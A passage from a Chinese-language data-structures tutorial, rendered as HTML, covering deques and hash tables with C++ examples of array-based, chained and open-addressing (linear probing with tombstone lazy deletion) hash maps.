class="hljs-type">int</span>&gt; <span class="hljs-title">arr</span><span class="hljs-params">(queSize)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = front; i &lt; queSize; i++, j++) &#123;<br>            arr[i] = nums[j % queCapacity];<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="双向队列"><a href="#双向队列" class="headerlink" title="双向队列"></a>双向队列</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化双向队列 */</span><br>deque&lt;<span class="hljs-type">int</span>&gt; deque;<br><br><span class="hljs-comment">/* 元素入队 */</span><br>deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span>);   <span class="hljs-comment">// 添加至队尾</span><br>deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<br>deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);<br>deque.<span class="hljs-built_in">push_front</span>(<span class="hljs-number">3</span>);  <span class="hljs-comment">// 添加至队首</span><br>deque.<span class="hljs-built_in">push_front</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* 访问元素 */</span><br><span class="hljs-type">int</span> front = deque.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">// 队首元素</span><br><span class="hljs-type">int</span> back = deque.<span class="hljs-built_in">back</span>();   <span class="hljs-comment">// 队尾元素</span><br><br><span class="hljs-comment">/* 元素出队 */</span><br>deque.<span class="hljs-built_in">pop_front</span>();  <span class="hljs-comment">// 队首元素出队</span><br>deque.<span class="hljs-built_in">pop_back</span>();   <span class="hljs-comment">// 队尾元素出队</span><br><br><span class="hljs-comment">/* 获取双向队列的长度 */</span><br><span class="hljs-type">int</span> size = deque.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断双向队列是否为空 */</span><br><span class="hljs-type">bool</span> empty = deque.<span class="hljs-built_in">empty</span>();<br></code></pre></td></tr></table></figure><h3 id="第6章-哈希表"><a href="#第6章-哈希表" class="headerlink" title="第6章 哈希表"></a>第6章 哈希表</h3><h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p>哈希表（hash table），又称散列表，它通过建立键 <code>key</code> 与值 <code>value</code> 之间的映射，实现高效的元素查询。具体而言，我们向哈希表中输入一个键 <code>key</code> ，则可以在$O(1)$时间内获取对应的值 <code>value</code> 。</p><table><thead><tr><th align="center"></th><th align="center">数组</th><th align="center">链表</th><th align="center">哈希表</th></tr></thead><tbody><tr><td align="center">查找元素</td><td align="center">$O(n)$</td><td align="center">$O(n)$</td><td align="center">$O(1)$</td></tr><tr><td align="center">添加元素</td><td align="center">$O(1)$</td><td align="center">$O(1)$</td><td align="center">$O(1)$</td></tr><tr><td align="center">删除元素</td><td align="center">$O(n)$</td><td align="center">$O(n)$</td><td align="center">$O(1)$</td></tr></tbody></table><h5 id="哈希表常用操作"><a href="#哈希表常用操作" class="headerlink" title="哈希表常用操作"></a>哈希表常用操作</h5><p>哈希表的常见操作包括：初始化、查询操作、添加键值对和删除键值对等，示例代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化哈希表 */</span><br>unordered_map&lt;<span class="hljs-type">int</span>, string&gt; map;<br><br><span class="hljs-comment">/* 添加操作 */</span><br><span class="hljs-comment">// 在哈希表中添加键值对 (key, value)</span><br>map[<span class="hljs-number">12836</span>] = <span class="hljs-string">&quot;小哈&quot;</span>;<br>map[<span class="hljs-number">15937</span>] = <span class="hljs-string">&quot;小啰&quot;</span>;<br>map[<span class="hljs-number">16750</span>] = <span class="hljs-string">&quot;小算&quot;</span>;<br>map[<span class="hljs-number">13276</span>] = <span class="hljs-string">&quot;小法&quot;</span>;<br>map[<span class="hljs-number">10583</span>] = <span class="hljs-string">&quot;小鸭&quot;</span>;<br><br><span class="hljs-comment">/* 查询操作 */</span><br><span class="hljs-comment">// 向哈希表中输入键 key ，得到值 value</span><br>string name = map[<span class="hljs-number">15937</span>];<br><br><span class="hljs-comment">/* 删除操作 */</span><br><span class="hljs-comment">// 在哈希表中删除键值对 (key, value)</span><br>map.<span class="hljs-built_in">erase</span>(<span class="hljs-number">10583</span>);<br></code></pre></td></tr></table></figure><p>哈希表有三种常用的遍历方式：遍历键值对、遍历键和遍历值。示例代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 遍历哈希表 */</span><br><span class="hljs-comment">// 遍历键值对 key-&gt;value</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> kv: map) &#123;<br>    cout &lt;&lt; kv.first &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; kv.second &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">// 使用迭代器遍历 key-&gt;value</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = map.<span class="hljs-built_in">begin</span>(); iter != map.<span class="hljs-built_in">end</span>(); iter++) &#123;<br>    cout &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot;-&gt;&quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="哈希表简单实现"><a href="#哈希表简单实现" class="headerlink" title="哈希表简单实现"></a>哈希表简单实现</h5><p>我们先考虑最简单的情况，<strong>仅用一个数组来实现哈希表</strong>。在哈希表中，我们将数组中的每个空位称为桶（bucket），每个桶可存储一个键值对。因此，查询操作就是找到 <code>key</code> 对应的桶，并在桶中获取 <code>value</code> 。</p><p>那么，如何基于 <code>key</code> 定位对应的桶呢？这是通过哈希函数（hash function）实现的。哈希函数的作用是将一个较大的输入空间映射到一个较小的输出空间。在哈希表中，输入空间是所有 <code>key</code> ，输出空间是所有桶（数组索引）。换句话说，输入一个 <code>key</code> ，<strong>我们可以通过哈希函数得到该 <code>key</code> 对应的键值对在数组中的存储位置</strong>。</p><p>输入一个 <code>key</code> ，哈希函数的计算过程分为以下两步。</p><ol><li>通过某种哈希算法 <code>hash()</code> 计算得到哈希值。</li><li>将哈希值对桶数量（数组长度）<code>capacity</code> 取模，从而获取该 <code>key</code> 对应的数组索引 <code>index</code> 。</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">index</span> <span class="hljs-operator">=</span> hash(key) % capacity<br></code></pre></td></tr></table></figure><p>随后，我们就可以利用 <code>index</code> 在哈希表中访问对应的桶，从而获取 <code>value</code> 。</p><p>以下代码实现了一个简单哈希表。其中，我们将 <code>key</code> 和 <code>value</code> 封装成一个类 <code>Pair</code> ，以表示键值对。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 键值对 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Pair</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> key;<br>    string val;<br>    <span class="hljs-built_in">Pair</span>(<span class="hljs-type">int</span> key, string val) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;key = key;<br>        <span class="hljs-keyword">this</span>-&gt;val = val;<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/* 基于数组实现的哈希表 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayHashMap</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    vector&lt;Pair *&gt; buckets;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">ArrayHashMap</span>() &#123;<br>        <span class="hljs-comment">// 初始化数组，包含 100 个桶</span><br>        buckets = <span class="hljs-built_in">vector</span>&lt;Pair *&gt;(<span class="hljs-number">100</span>);<br>    &#125;<br><br>    ~<span class="hljs-built_in">ArrayHashMap</span>() &#123;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;bucket : buckets) &#123;<br>            <span class="hljs-keyword">delete</span> bucket;<br>        &#125;<br>        buckets.<span class="hljs-built_in">clear</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 哈希函数 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hashFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = key % <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br><br>    <span class="hljs-comment">/* 查询操作 */</span><br>    <span class="hljs-function">string <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        Pair *pair = buckets[index];<br>        <span class="hljs-keyword">if</span> (pair == <span class="hljs-literal">nullptr</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> pair-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-type">int</span> key, string val)</span> </span>&#123;<br>        Pair *pair = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pair</span>(key, val);<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        buckets[index] = pair;<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        <span class="hljs-comment">// 释放内存并置为 nullptr</span><br>        <span class="hljs-keyword">delete</span> buckets[index];<br>        buckets[index] = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有键值对 */</span><br>    <span class="hljs-function">vector&lt;Pair *&gt; <span class="hljs-title">pairSet</span><span class="hljs-params">()</span> </span>&#123;<br>        vector&lt;Pair *&gt; pairSet;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span>) &#123;<br>                pairSet.<span class="hljs-built_in">push_back</span>(pair);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> pairSet;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有键 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">keySet</span><span class="hljs-params">()</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; keySet;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span>) &#123;<br>                keySet.<span class="hljs-built_in">push_back</span>(pair-&gt;key);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> keySet;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有值 */</span><br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">valueSet</span><span class="hljs-params">()</span> </span>&#123;<br>        vector&lt;string&gt; valueSet;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span>) &#123;<br>                valueSet.<span class="hljs-built_in">push_back</span>(pair-&gt;val);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> valueSet;<br>    &#125;<br><br>    <span class="hljs-comment">/* 打印哈希表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (Pair *kv : <span class="hljs-built_in">pairSet</span>()) &#123;<br>            cout &lt;&lt; kv-&gt;key &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; kv-&gt;val &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="哈希冲突"><a href="#哈希冲突" class="headerlink" title="哈希冲突"></a>哈希冲突</h4><p>哈希冲突会导致查询结果错误，严重影响哈希表的可用性。为了解决该问题，每当遇到哈希冲突时，我们就进行哈希表扩容，直至冲突消失为止。此方法简单粗暴且有效，但效率太低，因为哈希表扩容需要进行大量的数据搬运与哈希值计算。为了提升效率，我们可以采用以下策略。</p><ol><li>改良哈希表数据结构，使得哈希表可以在出现哈希冲突时正常工作。</li><li>仅在必要时，即当哈希冲突比较严重时，才执行扩容操作。</li></ol><p>哈希表的结构改良方法主要包括“链式地址”和“开放寻址”。</p><h5 id="链式地址"><a href="#链式地址" class="headerlink" title="链式地址"></a>链式地址</h5><p>在原始哈希表中，每个桶仅能存储一个键值对。链式地址（separate chaining）将单个元素转换为链表，将键值对作为链表节点，将所有发生冲突的键值对都存储在同一链表中。下图展示了一个链式地址哈希表的例子。</p><p><img src="https://www.hello-algo.com/chapter_hashing/hash_collision.assets/hash_table_chaining.png" srcset="/img/loading.gif" lazyload></p><p>基于链式地址实现的哈希表的操作方法发生了以下变化：</p><ul><li><strong>查询元素</strong>：输入 <code>key</code> ，经过哈希函数得到桶索引，即可访问链表头节点，然后遍历链表并对比 <code>key</code> 以查找目标键值对。</li><li><strong>添加元素</strong>：首先通过哈希函数访问链表头节点，然后将节点（键值对）添加到链表中。</li><li><strong>删除元素</strong>：根据哈希函数的结果访问链表头部，接着遍历链表以查找目标节点并将其删除。</li></ul><p>链式地址存在以下局限性。</p><ul><li><strong>占用空间增大</strong>：链表包含节点指针，它相比数组更加耗费内存空间。</li><li><strong>查询效率降低</strong>：因为需要线性遍历链表来查找对应元素。</li></ul><p>值得注意的是，当链表很长时，查询效率$O(n)$很差。<strong>此时可以将链表转换为“AVL 树”或“红黑树”</strong>，从而将查询操作的时间复杂度优化至$O(logn)$。</p><h5 id="开放寻址"><a href="#开放寻址" class="headerlink" title="开放寻址"></a>开放寻址</h5><p>开放寻址（open addressing）不引入额外的数据结构，而是通过“多次探测”来处理哈希冲突，探测方式主要包括线性探测、平方探测和多次哈希等。</p><ol><li>线性寻址：</li></ol><p>线性探测采用固定步长的线性搜索来进行探测，其操作方法与普通哈希表有所不同。</p><ul><li><strong>插入元素</strong>：通过哈希函数计算桶索引，若发现桶内已有元素，则从冲突位置向后线性遍历（步长通常为1），直至找到空桶，将元素插入其中。</li><li><strong>查找元素</strong>：若发现哈希冲突，则使用相同步长向后进行线性遍历，直到找到对应元素，返回 <code>value</code> 即可；如果遇到空桶，说明目标元素不在哈希表中，返回 <code>None</code> 。</li></ul><p>然而，<strong>线性探测容易产生“聚集现象”</strong>。具体来说，数组中连续被占用的位置越长，这些连续位置发生哈希冲突的可能性越大，从而进一步促使该位置的聚堆生长，形成恶性循环，最终导致增删查改操作效率劣化。</p><p>值得注意的是，<strong>我们不能在开放寻址哈希表中直接删除元素</strong>。这是因为删除元素会在数组内产生一个空桶 <code>None</code> ，而当查询元素时，线性探测到该空桶就会返回，因此在该空桶之下的元素都无法再被访问到，程序可能误判这些元素不存在，如下图所示：</p><p><img src="https://www.hello-algo.com/chapter_hashing/hash_collision.assets/hash_table_open_addressing_deletion.png" srcset="/img/loading.gif" lazyload></p><p>为了解决该问题，我们可以采用懒删除（lazy deletion）机制：它不直接从哈希表中移除元素，<strong>而是利用一个常量 <code>TOMBSTONE</code> 来标记这个桶</strong>。在该机制下，<code>None</code> 和 <code>TOMBSTONE</code> 都代表空桶，都可以放置键值对。但不同的是，线性探测到 <code>TOMBSTONE</code> 时应该继续遍历，因为其之下可能还存在键值对。</p><p>然而，<strong>懒删除可能会加速哈希表的性能退化</strong>。这是因为每次删除操作都会产生一个删除标记，随着 <code>TOMBSTONE</code> 的增加，搜索时间也会增加，因为线性探测可能需要跳过多个 <code>TOMBSTONE</code> 才能找到目标元素。</p><p>为此，考虑在线性探测中记录遇到的首个 <code>TOMBSTONE</code> 的索引，并将搜索到的目标元素与该 <code>TOMBSTONE</code> 交换位置。这样做的好处是当每次查询或添加元素时，元素会被移动至距离理想位置（探测起始点）更近的桶，从而优化查询效率。</p><p>以下代码实现了一个包含懒删除的开放寻址（线性探测）哈希表。为了更加充分地使用哈希表的空间，我们将哈希表看作一个“环形数组”，当越过数组尾部时，回到头部继续遍历。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 开放寻址哈希表 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMapOpenAddressing</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> size;                             <span class="hljs-comment">// 键值对数量</span><br>    <span class="hljs-type">int</span> capacity = <span class="hljs-number">4</span>;                     <span class="hljs-comment">// 哈希表容量</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">double</span> loadThres = <span class="hljs-number">2.0</span> / <span class="hljs-number">3.0</span>;     <span class="hljs-comment">// 触发扩容的负载因子阈值</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> extendRatio = <span class="hljs-number">2</span>;            <span class="hljs-comment">// 扩容倍数</span><br>    vector&lt;Pair *&gt; buckets;               <span class="hljs-comment">// 桶数组</span><br>    Pair *TOMBSTONE = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pair</span>(<span class="hljs-number">-1</span>, <span class="hljs-string">&quot;-1&quot;</span>); <span class="hljs-comment">// 删除标记</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/* 构造方法 */</span><br>    <span class="hljs-built_in">HashMapOpenAddressing</span>() : <span class="hljs-built_in">size</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">buckets</span>(capacity, <span class="hljs-literal">nullptr</span>) &#123;<br>    &#125;<br><br>    <span class="hljs-comment">/* 析构方法 */</span><br>    ~<span class="hljs-built_in">HashMapOpenAddressing</span>() &#123;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span> &amp;&amp; pair != TOMBSTONE) &#123;<br>                <span class="hljs-keyword">delete</span> pair;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">delete</span> TOMBSTONE;<br>    &#125;<br><br>    <span class="hljs-comment">/* 哈希函数 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hashFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> key % capacity;<br>    &#125;<br><br>    <span class="hljs-comment">/* 负载因子 */</span><br>    <span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">loadFactor</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)size / capacity;<br>    &#125;<br><br>    <span class="hljs-comment">/* 搜索 key 对应的桶索引 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findBucket</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        <span class="hljs-type">int</span> firstTombstone = <span class="hljs-number">-1</span>;<br>        <span class="hljs-comment">// 线性探测，当遇到空桶时跳出</span><br>        <span class="hljs-keyword">while</span> (buckets[index] != <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-comment">// 若遇到 key ，返回对应的桶索引</span><br>            <span class="hljs-keyword">if</span> (buckets[index]-&gt;key == key) &#123;<br>                <span class="hljs-comment">// 若之前遇到了删除标记，则将键值对移动至该索引处</span><br>                <span class="hljs-keyword">if</span> (firstTombstone != <span class="hljs-number">-1</span>) &#123;<br>                    buckets[firstTombstone] = buckets[index];<br>                    buckets[index] = TOMBSTONE;<br>                    <span class="hljs-keyword">return</span> firstTombstone; <span class="hljs-comment">// 返回移动后的桶索引</span><br>                &#125;<br>                <span class="hljs-keyword">return</span> index; <span class="hljs-comment">// 返回桶索引</span><br>            &#125;<br>            <span class="hljs-comment">// 记录遇到的首个删除标记</span><br>            <span class="hljs-keyword">if</span> (firstTombstone == <span class="hljs-number">-1</span> &amp;&amp; buckets[index] == TOMBSTONE) &#123;<br>                firstTombstone = index;<br>            &#125;<br>            <span class="hljs-comment">// 计算桶索引，越过尾部则返回头部</span><br>            index = (index + <span class="hljs-number">1</span>) % capacity;<br>        &#125;<br>        <span class="hljs-comment">// 若 key 不存在，则返回添加点的索引</span><br>        <span class="hljs-keyword">return</span> firstTombstone == <span class="hljs-number">-1</span> ? index : firstTombstone;<br>    &#125;<br><br>    <span class="hljs-comment">/* 查询操作 */</span><br>    <span class="hljs-function">string <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-comment">// 搜索 key 对应的桶索引</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">findBucket</span>(key);<br>        <span class="hljs-comment">// 若找到键值对，则返回对应 val</span><br>        <span class="hljs-keyword">if</span> (buckets[index] != <span class="hljs-literal">nullptr</span> &amp;&amp; buckets[index] != TOMBSTONE) &#123;<br>            <span class="hljs-keyword">return</span> buckets[index]-&gt;val;<br>        &#125;<br>        <span class="hljs-comment">// 若键值对不存在，则返回空字符串</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-type">int</span> key, string val)</span> </span>&#123;<br>        <span class="hljs-comment">// 当负载因子超过阈值时，执行扩容</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">loadFactor</span>() &gt; loadThres) &#123;<br>            <span class="hljs-built_in">extend</span>();<br>        &#125;<br>        <span class="hljs-comment">// 搜索 key 对应的桶索引</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">findBucket</span>(key);<br>        <span class="hljs-comment">// 若找到键值对，则覆盖 val 并返回</span><br>        <span class="hljs-keyword">if</span> (buckets[index] != <span class="hljs-literal">nullptr</span> &amp;&amp; buckets[index] != TOMBSTONE) &#123;<br>            buckets[index]-&gt;val = val;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 若键值对不存在，则添加该键值对</span><br>        buckets[index] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pair</span>(key, val);<br>        size++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-comment">// 搜索 key 对应的桶索引</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">findBucket</span>(key);<br>        <span class="hljs-comment">// 若找到键值对，则用删除标记覆盖它</span><br>        <span class="hljs-keyword">if</span> (buckets[index] != <span 